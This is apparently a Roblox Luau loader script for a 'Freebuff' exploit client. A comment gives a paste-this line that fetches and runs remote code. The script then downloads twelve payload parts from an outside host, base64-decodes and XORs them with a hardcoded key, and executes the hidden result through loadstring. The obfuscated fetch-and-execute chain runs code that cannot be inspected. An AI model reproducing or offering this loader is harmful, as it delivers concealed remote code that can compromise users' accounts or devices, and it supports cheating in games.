--!nocheck
-- ╕ FREEBUFF CLIENT — v2 loader (chunked b64+xor payload from the repo parts) ╕
-- Paste:  loadstring(game:HttpGet("https://raw.githubusercontent.com/Rolandthehacker67/freebuff.lua/main/FreebuffClient-Loader.luau"))()
-- (loader pulls the 12 payload parts from a reliable single host, not from this repo)

local REPO = "https://site-c6f79b10eafc4ab39f22ee80154776ff.freebuff.page/parts-client/p"
local NPARTS = 12

local chunks = {}
for i = 1, NPARTS do
	local ok, body = pcall(function() return game:HttpGet(REPO .. i .. ".lua") end)
	if not ok or type(body) ~= "string" or body == "" then
		error("[Freebuff] failed to fetch payload part " .. i, 0)
	end
	chunks[i] = body:gsub("%s+", "")
end
local P = table.concat(chunks)

local KEY = "FreebuffExecutor2026"
local B64CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local LOOKUP = {}
for i = 1, #B64CHARS do
	LOOKUP[string.byte(B64CHARS, i)] = i - 1
end

local function decodePayload(p)
	local rawParts = {}
	local j = 0
	for i = 1, #p, 4 do
		local ch1, ch2, ch3, ch4 = string.byte(p, i, i + 3)
		local a = LOOKUP[ch1] or 0
		local b = LOOKUP[ch2] or 0
		local c = LOOKUP[ch3] or 0
		local d = LOOKUP[ch4] or 0
		local v = a * 262144 + b * 4096 + c * 64 + d
		local hasC = ch3 ~= 61
		local hasD = ch4 ~= 61
		j += 1 rawParts[j] = string.char(math.floor(v / 65536) % 256)
		if hasC then
			j += 1 rawParts[j] = string.char(math.floor(v / 256) % 256)
		end
		if hasD then
			j += 1 rawParts[j] = string.char(v % 256)
		end
	end
	local raw = table.concat(rawParts)
	local mn = #KEY
	local out = {}
	for i = 1, #raw do
		out[i] = string.char(bit32.bxor(string.byte(raw, i), string.byte(KEY, (i - 1) % mn + 1)))
	end
	return table.concat(out)
end

local ok, boot = pcall(decodePayload, P)
if not ok then
	error("[Freebuff] payload decode failed: " .. tostring(boot), 0)
end
local f, err = loadstring(boot)
if not f then
	error("[Freebuff] protected payload failed to load: " .. tostring(err), 0)
end
return f()
